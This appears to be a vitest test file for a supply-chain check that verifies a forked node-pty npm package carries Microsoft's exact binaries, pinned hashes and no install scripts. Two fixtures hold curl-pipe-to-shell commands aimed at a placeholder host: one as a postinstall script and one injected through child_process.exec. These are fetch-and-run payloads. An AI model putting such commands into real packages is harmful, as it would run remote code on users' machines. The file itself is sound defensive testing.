import { createHash } from 'node:crypto';
import { gzipSync } from 'node:zlib';

import { describe, expect, it } from 'vitest';

import { compare, intact, MAIN, mainProblems, pinned, platformProblems } from '../scripts/pty-binaries.mjs';
import { readTar } from '../scripts/upstream-report.mjs';

/** A .tgz as npm pack writes one: ustar entries under package/. */
function tgz(files: Record<string, string | Buffer>): Buffer {
  const blocks: Buffer[] = [];
  for (const [name, content] of Object.entries(files)) {
    const body = Buffer.from(content);
    const header = Buffer.alloc(512);
    header.write(`package/${name}`, 0);
    header.write('0000644\0', 100);
    header.write('0000000\0', 108);
    header.write('0000000\0', 116);
    header.write(`${body.length.toString(8).padStart(11, '0')}\0`, 124);
    header.write('00000000000\0', 136);
    header.write('        ', 148);
    header.write('0', 156);
    header.write('ustar\0', 257);
    header.write('00', 263);
    header.write(`${header.reduce((sum, byte) => sum + byte, 0).toString(8).padStart(6, '0')}\0 `, 148);
    blocks.push(header, body, Buffer.alloc((512 - (body.length % 512)) % 512));
  }
  return gzipSync(Buffer.concat([...blocks, Buffer.alloc(1024)]));
}

const integrity = (data: Buffer) => `sha512-${createHash('sha512').update(data).digest('base64')}`;
const files = (tarball: Buffer) => new Map([...readTar(tarball) as Map<string, Buffer>].map(([name, data]) => [name.slice('package/'.length), data]));

// Made-up bytes standing in for the binaries.
const microsoft = readTar(tgz({
  'package.json': '{"name":"node-pty"}',
  'lib/index.js': 'exports.spawn = () => {};\n',
  'prebuilds/plan9-x64/pty.node': Buffer.from([0x7f, 0x45, 0x4c, 0x46, 1, 2, 3]),
  'prebuilds/plan9-x64/spawn-helper': Buffer.from([0xca, 0xfe, 0xba, 0xbe]),
})) as Map<string, Buffer>;

describe('the check that the PTY is Microsoft’s', () => {
  it('passes a platform package whose every file is Microsoft’s, but its own manifest, readme and license', () => {
    const lydell = files(tgz({
      'package.json': '{"name":"@lydell/node-pty-plan9-x64","exports":"./lib/index.js"}',
      'README.md': 'Stripped down for plan9-x64.\n',
      LICENSE: 'MIT\n',
      'lib/index.js': 'exports.spawn = () => {};\n',
      'prebuilds/plan9-x64/pty.node': Buffer.from([0x7f, 0x45, 0x4c, 0x46, 1, 2, 3]),
      'prebuilds/plan9-x64/spawn-helper': Buffer.from([0xca, 0xfe, 0xba, 0xbe]),
    }));
    expect(compare(lydell, microsoft, 'plan9-x64')).toEqual({
      problems: [],
      checked: ['lib/index.js', 'prebuilds/plan9-x64/pty.node', 'prebuilds/plan9-x64/spawn-helper'],
    });
  });

  it('fails one with a binary that differs by a byte, or a file Microsoft’s has not, or no binary at all', () => {
    const manifest = '{"name":"@lydell/node-pty-plan9-x64","exports":"./lib/index.js"}';
    const changed = files(tgz({ 'package.json': manifest, 'prebuilds/plan9-x64/pty.node': Buffer.from([0x7f, 0x45, 0x4c, 0x46, 1, 2, 4]) }));
    expect(compare(changed, microsoft, 'plan9-x64').problems).toEqual([
      expect.stringMatching(/^plan9-x64: prebuilds\/plan9-x64\/pty\.node is not Microsoft's \(sha256 [0-9a-f]{64}, Microsoft's [0-9a-f]{64}\)$/),
      'plan9-x64: no native module that is Microsoft\'s',
    ]);
    const added = files(tgz({ 'package.json': manifest, 'prebuilds/plan9-x64/pty.node': Buffer.from([0x7f, 0x45, 0x4c, 0x46, 1, 2, 3]), 'lib/extra.js': 'more\n' }));
    expect(compare(added, microsoft, 'plan9-x64').problems).toEqual(['plan9-x64: lib/extra.js is not in Microsoft\'s package']);
    expect(compare(files(tgz({ 'package.json': manifest, 'lib/index.js': 'exports.spawn = () => {};\n' })), microsoft, 'plan9-x64').problems).toEqual(['plan9-x64: no native module that is Microsoft\'s']);
  });

  it('fails one whose manifest would run something as npm installs it, add a command, or load another module', () => {
    const binary = { 'prebuilds/plan9-x64/pty.node': Buffer.from([0x7f, 0x45, 0x4c, 0x46, 1, 2, 3]) };
    const withManifest = (manifest: object, more: Record<string, string> = {}) => compare(files(tgz({ 'package.json': JSON.stringify(manifest), ...binary, ...more })), microsoft, 'plan9-x64').problems;
    expect(withManifest({ exports: './lib/index.js', scripts: { postinstall: 'curl https://example.invalid/x | sh' } })).toEqual(['plan9-x64: its package.json has scripts (postinstall)']);
    expect(withManifest({ exports: './lib/index.js', bin: { pty: './lib/index.js' } })).toEqual(['plan9-x64: its package.json has a bin']);
    expect(withManifest({ exports: './lib/other.js' })).toEqual(['plan9-x64: its package.json exports "./lib/other.js", not "./lib/index.js"']);
    // Packages of its own, which npm would install with it, unchecked.
    expect(withManifest({ exports: './lib/index.js', dependencies: { 'left-pad': '^1.0.0' } })).toEqual(['plan9-x64: its package.json has dependencies (left-pad)']);
    expect(withManifest({ exports: './lib/index.js', peerDependencies: { helper: '*' } })).toEqual(['plan9-x64: its package.json has peerDependencies (helper)']);
    // A binding.gyp is built by npm as it installs, Microsoft's or not.
    expect(withManifest({ exports: './lib/index.js' }, { 'binding.gyp': '{}' })).toEqual([
      'plan9-x64: it has a binding.gyp, which npm would build',
      'plan9-x64: binding.gyp is not in Microsoft\'s package',
    ]);
  });

  it('passes @lydell/node-pty only with its own files as read and pinned, and nothing run as it installs', () => {
    const index = 'module.exports = require(`@lydell/node-pty-${process.platform}-${process.arch}`);\n';
    const types = 'export declare function spawn(): void;\n';
    const manifest = JSON.stringify({ name: '@lydell/node-pty', exports: MAIN.exports });
    const read = { ...MAIN.files };
    try {
      Object.assign(MAIN.files, { 'index.js': createHash('sha256').update(index).digest('hex'), 'node-pty.d.ts': createHash('sha256').update(types).digest('hex') });
      const main = (more: Record<string, string>) => mainProblems(files(tgz({ 'package.json': manifest, 'index.js': index, 'node-pty.d.ts': types, 'README.md': 'x', ...more })), 'main');
      expect(main({})).toEqual([]);
      // A line more in the module Pelican loads first: read it, then pin it.
      expect(main({ 'index.js': `${index}require('child_process').exec('curl https://example.invalid | sh');\n` })).toEqual([
        expect.stringMatching(/^main: index\.js is not the one read for .* \(sha256 [0-9a-f]{64}\): read it, then pin its sha256 in scripts\/pty-binaries\.mjs$/),
      ]);
      expect(main({ 'postinstall.js': 'x' })).toEqual(['main: postinstall.js is not one of its files read and pinned in scripts/pty-binaries.mjs']);
      expect(main({ 'package.json': JSON.stringify({ exports: MAIN.exports, scripts: { install: 'node postinstall.js' } }) })).toEqual(['main: its package.json has scripts (install)']);
    } finally {
      Object.assign(MAIN.files, read);
    }
  });

  it('takes a download only when it is what its integrity says', () => {
    const data = tgz({ 'lib/index.js': 'x' });
    expect(intact(data, integrity(data))).toBe(true);
    expect(intact(Buffer.concat([data, Buffer.from([0])]), integrity(data))).toBe(false);
    expect(intact(data, `sha1-${createHash('sha1').update(data).digest('base64')}`)).toBe(false);
    expect(intact(data, '')).toBe(false);
  });

  it('reads the exact version package.json pins, and the platform packages package-lock.json pins for it', () => {
    const shrinkwrap = {
      packages: {
        'node_modules/@lydell/node-pty': {
          version: '1.2.0-beta.18', resolved: 'https://registry.example/main.tgz', integrity: 'sha512-BBBB', optionalDependencies: { '@lydell/node-pty-plan9-x64': '1.2.0-beta.18' },
        },
        'node_modules/@lydell/node-pty-plan9-x64': { version: '1.2.0-beta.18', resolved: 'https://registry.example/x.tgz', integrity: 'sha512-AAAA' } as Record<string, unknown>,
      },
    };
    expect(pinned({ optionalDependencies: { '@lydell/node-pty': '1.2.0-beta.18' } }, shrinkwrap)).toEqual({
      version: '1.2.0-beta.18',
      main: { resolved: 'https://registry.example/main.tgz', integrity: 'sha512-BBBB' },
      platforms: [{ name: '@lydell/node-pty-plan9-x64', platform: 'plan9-x64', resolved: 'https://registry.example/x.tgz', integrity: 'sha512-AAAA' }],
    });
    expect(() => pinned({ optionalDependencies: { '@lydell/node-pty': '^1.2.0-beta.18' } }, shrinkwrap)).toThrow(/not pinned to one version/);
    expect(() => pinned({ optionalDependencies: { '@lydell/node-pty': '1.2.0-beta.17' } }, shrinkwrap)).toThrow(/package-lock.json pins/);
    // npm records an install script, or a binding.gyp it would build, as hasInstallScript.
    const scripted = structuredClone(shrinkwrap);
    scripted.packages['node_modules/@lydell/node-pty-plan9-x64'].hasInstallScript = true;
    expect(() => pinned({ optionalDependencies: { '@lydell/node-pty': '1.2.0-beta.18' } }, scripted)).toThrow(/@lydell\/node-pty-plan9-x64 1\.2\.0-beta\.18 has an install script/);
    const mainScripted = structuredClone(shrinkwrap);
    (mainScripted.packages['node_modules/@lydell/node-pty'] as Record<string, unknown>).hasInstallScript = true;
    expect(() => pinned({ optionalDependencies: { '@lydell/node-pty': '1.2.0-beta.18' } }, mainScripted)).toThrow(/@lydell\/node-pty 1\.2\.0-beta\.18 has an install script/);
  });

  it('passes @lydell/node-pty only where its own package.json pins the platform packages package-lock.json pins, each at exactly its version, as an install from npm takes them', () => {
    const names = ['@lydell/node-pty-plan9-x64', '@lydell/node-pty-plan9-arm64'];
    const manifest = (optionalDependencies: Record<string, string>) => Buffer.from(JSON.stringify({ name: '@lydell/node-pty', optionalDependencies }));
    expect(platformProblems(manifest({ '@lydell/node-pty-plan9-arm64': '1.2.0-beta.18', '@lydell/node-pty-plan9-x64': '1.2.0-beta.18' }), 'main', '1.2.0-beta.18', names)).toEqual([]);
    // A range would let npm take a later version, which nothing here checked.
    expect(platformProblems(manifest({ '@lydell/node-pty-plan9-arm64': '^1.2.0-beta.18', '@lydell/node-pty-plan9-x64': '1.2.0-beta.18' }), 'main', '1.2.0-beta.18', names)).toEqual([
      'main: its package.json asks for @lydell/node-pty-plan9-arm64 ^1.2.0-beta.18, not exactly 1.2.0-beta.18',
    ]);
    // A platform the lockfile does not pin is one nothing here checked.
    expect(platformProblems(manifest({ '@lydell/node-pty-plan9-x64': '1.2.0-beta.18', '@lydell/node-pty-plan9-riscv': '1.2.0-beta.18' }), 'main', '1.2.0-beta.18', names)).toEqual([
      'main: its package.json names @lydell/node-pty-plan9-riscv, @lydell/node-pty-plan9-x64, package-lock.json pins @lydell/node-pty-plan9-arm64, @lydell/node-pty-plan9-x64',
    ]);
    expect(platformProblems(undefined, 'main', '1.2.0-beta.18', names)).toEqual(['main: no package.json that reads']);
  });
});
